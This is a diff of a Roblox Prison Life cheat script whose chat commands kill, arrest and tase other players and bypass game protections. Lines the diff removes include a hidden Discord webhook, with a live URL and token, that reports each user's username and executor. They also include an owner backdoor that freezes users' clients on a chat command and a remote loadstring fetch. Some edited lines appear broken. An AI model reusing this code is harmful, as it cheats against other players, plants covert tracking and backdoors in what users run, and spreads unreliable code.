@@ -428,7 +428,7 @@ local Cmd = {}
 
 Cmd[#Cmd + 1] = {Text = "versions "..Versions,Title = "Script versions"}
 Cmd[#Cmd + 1] = {Text = "script by Jezko",Title = "Remaked Updated"}
-Cmd[#Cmd + 1] = {Text = "script mejorado por iJezko25#6666",Title = "My Discord"}
+Cmd[#Cmd + 1] = {Text = "script mejorado por iJezko25",Title = "My Discord"}
 Cmd[#Cmd + 1] = {Text = "Jezko",Title = "Owner 🤣"}
 Cmd[#Cmd + 1] = {Text = "Click?",Title = "Click on cmd to use quick cmd"}
 Cmd[#Cmd + 1] = {Text = "*Note*",Title = "New updates: Reduce lag & faster bring and more commands"}
@@ -678,9 +678,6 @@ if DisableScript then
 	DisableScript()
 end
 
-local connections = getconnections(game.ReplicatedStorage.ReplicateEvent.OnClientEvent)
-local tazePlayer = getconnections(workspace.Remote.tazePlayer.OnClientEvent)
-
 local StringsLowerMessage = false -- If this true: if commands is 'Kill' but when you say k or i or l it will match to 'Kill' and you can turns this off or on when you are ingame with cmd 'slm' and 'uslm'
 local ScriptDisabled = false
 local LoopBeam = {}
@@ -797,6 +794,8 @@ function Kill(Player)
 	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
 end
 
+--Test3
+
 function KillTeam(Team)
 	local events = {}
 	local gun = nil
@@ -841,6 +840,8 @@ function KillTeam(Team)
 	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
 end
 
+--Test2
+
 function KillAll()
 	local events = {}
 	local gun = nil
@@ -884,52 +885,6 @@ function KillAll()
 	end)()
 	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
 end
-
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Level 6 Exploit"
-
-local url =
-   "https://discord.com/api/webhooks/914947735793328148/6THEgIIsV5VRT33XBdIxFpnN1Z5nOBet13lQbqARq3KxPqKe8qiBJwGANT7UJK9uz567"
-local data = {
-   ["content"] = "`PrisonLife Whitelister`",
-   ["embeds"] = {
-       {
-           ["title"] = "**Execution Request**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name,
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           },
-           ["fields"] = {
-				{
-					["name"] = "Using: ".. webhookcheck .."",
-					["value"] = "Whitelisted: **True**",
-					["inline"] = true
-				},
-				{
-					["name"] = "**Script Version Check**",
-					["value"] = "Version: **".. Versions .."**",
-					["inline"] = true
-				}
-			}
-       }
-   }
-}
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
 
 function Tase(Player)
 	local events = {}
@@ -1244,6 +1199,8 @@ function ArrestEvent(Player, Time)
 		workspace.Remote.arrest:InvokeServer(Player.Character.Head)
 	end
 end
+
+--Test1Works
 
 function Arrest(Player, Time)
 	local Time = tonumber(Time) or 1
@@ -1627,6 +1584,8 @@ local Gyro = nil
 local Velocity = nil
 local SuperKnife = {}
 
+--DoesntWork
+
 function PlayerChatted(Message)
 	if ScriptDisabled then return end
 	Split = Message:split(" ")
@@ -1635,6 +1594,7 @@ function PlayerChatted(Message)
 	Arg3 = Split[3]
 	Arg4 = Split[4]
 	UseCommand = true
+
 	if Command("killsaura") then
 		local plr = GetPlayer(Arg2)
 		if plr ~= nil and not KillAura[plr.UserId] then
@@ -2520,7 +2480,7 @@ function PlayerChatted(Message)
 		Notify("Turn taser bypass on", Color3.fromRGB(0, 255, 0), "Success")
 	end
 	if Command("notaserbypass") or Command("unlock") or Command("untaserbypass") then
-		for i,v in pairs(getconnections(workspace.Remote.tazePlayer.OnClientEvent)) do
+		for i,v in pairs(game:GetService("Workspace").Remote.tazePlayer) do
 			v:Enable()
 		end
 		States.Anti_Taser = false
@@ -2958,6 +2918,9 @@ end)
 	end
 	if Command("antivest") or Command("anticrash") then
 		States.Anti_Crash = true
+
+        local connections = game:GetService("ReplicatedStorage").ReplicateEvent
+
 		if States.Anti_Crash then
 			for i,v in pairs(connections) do
 				v:Disable()
@@ -2971,6 +2934,9 @@ end)
 	end
 	if Command("unantivest") or Command("unanticrash") then
 		States.Anti_Crash = false
+
+        local connections = game:GetService("ReplicatedStorage").ReplicateEvent
+
 		if States.Anti_Crash then
 			for i,v in pairs(connections) do
 				v:Disable()
@@ -4842,21 +4808,6 @@ getgenv().DisableScript = function()
 	end)
 end
 
---AntiAbusers
-local Action = game.Players:GetPlayers()
-  for i = 1,#Action do
-Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "0nlyJezko" then
-        local player = game.Players.LocalPlayer
-        if msg == "?disable" then
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Script Disabled, Disconnecting.', 'All')
-        wait(2)
-        while true do end
-        end
-    end
-  end)
-end
-
 --Kick
 local Action = game.Players:GetPlayers()
   for i = 1,#Action do
@@ -4872,15 +4823,6 @@ Action[i].Chatted:connect(function(msg, recipient)
         end
     end
   end)
-end
-
---FastCmd
-local cmduser = game.Players.LocalPlayer
-
-if cmduser.Name == "0nlyJezko" then
-    print"Detected Fast Commands"
-    States.Auto_Guns=true;Notify("Turn auto guns on",Color3.fromRGB(0,255,0),"Success")
-    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('','')States.Auto_Refresh=true;Notify("Turn auto refresh on",Color3.fromRGB(0,255,0),"Success")States.Anti_Spam_Arrest=true;Notify("Turn anti spam arrest on",Color3.fromRGB(0,255,0),"Success")local a=game:GetService("ReplicatedStorage")local b=a:FindFirstChild("meleeEvent")local c=game.Players.LocalPlayer:GetMouse()local d=false;local e=false;States.SuperPunch=true;Notify("Turn super punch on",Color3.fromRGB(0,255,0),"Success")local function d()if not States.Fast_Punch then e=true;local f=Instance.new("Part",game.Players.LocalPlayer.Character)f.Transparency=1;f.Size=Vector3.new(5,2,3)f.CanCollide=false;local g=Instance.new("Weld",f)g.Part0=game.Players.LocalPlayer.Character.Torso;g.Part1=f;g.C1=CFrame.new(0,0,2)f.Touched:connect(function(h)if game.Players:FindFirstChild(h.Parent.Name)then local i=game.Players:FindFirstChild(h.Parent.Name)if i.Name~=game.Players.LocalPlayer.Name then f:Destroy()for j=1,100 do b:FireServer(i)end end end end)wait(0.9)e=false;f:Destroy()else e=true;local f=Instance.new("Part",game.Players.LocalPlayer.Character)f.Transparency=1;f.Size=Vector3.new(5,2,3)f.CanCollide=false;local g=Instance.new("Weld",f)g.Part0=game.Players.LocalPlayer.Character.Torso;g.Part1=f;g.C1=CFrame.new(0,0,2)f.Touched:connect(function(h)if game.Players:FindFirstChild(h.Parent.Name)then local i=game.Players:FindFirstChild(h.Parent.Name)if i.Name~=game.Players.LocalPlayer.Name then f:Destroy()for j=1,100 do b:FireServer(i)end end end end)wait(0.1)e=false;f:Destroy()end end;c.KeyDown:connect(function(k)if not e and States.SuperPunch then if k:lower()=="f"then d()end end end)wait(1)States.Anti_Void=true;Notify("Turn anti void on",Color3.fromRGB(0,255,0),"Success")States.Fast_Punch=true;Notify("Turn fast punch on",Color3.fromRGB(0,255,0),"Success")wait(1)Notify("Infinite Yield Loaded",Color3.fromRGB(0,255,0),"Success")loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source',true))()local l=GetPos()local m=GetCamPos()workspace.Remote.loadchar:InvokeServer(nil,BrickColor.new("Really black").Name)game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=l;workspace.CurrentCamera.CFrame=m;Notify("Changed name tag color to "..Arg1:split("."),Color3.fromRGB(0,255,0),"Success")wait(1)
 end
 
 workspace.Remote.loadchar:InvokeServer()
